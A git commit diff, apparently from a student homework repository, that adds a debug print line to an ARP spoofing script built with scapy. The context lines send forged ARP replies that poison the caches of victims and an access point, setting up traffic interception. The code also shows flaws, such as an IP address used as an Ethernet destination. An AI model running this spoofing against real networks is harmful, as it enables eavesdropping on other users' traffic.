82768d279a540141ad75f41bbab84ebab81ce59c
q40603 <q40603@gmail.com>
2020-05-07 12:34:30 +0800

    forward

--- hw2/arp.py
+++ hw2/arp.py
@@ -77,6 +77,7 @@ def arp():
 	for v in range(len(vip)):
 		for i in range(10):
 			print('send arp ', i)
+			print(vip[i],vmac[i])
 			sendp(Ether(dst=vip[i], src=attacker_mac)/ARP(pdst=vip[i], psrc=ap_ip, hwdst=vmac[i], hwsrc=attacker_mac, op=2))
 			sendp(Ether(dst=ap_mac, src=attacker_mac)/ARP(pdst=ap_ip, psrc=vip[i], hwdst=vmac[i], hwsrc=attacker_mac, op=2))
 			time.sleep(0.1)
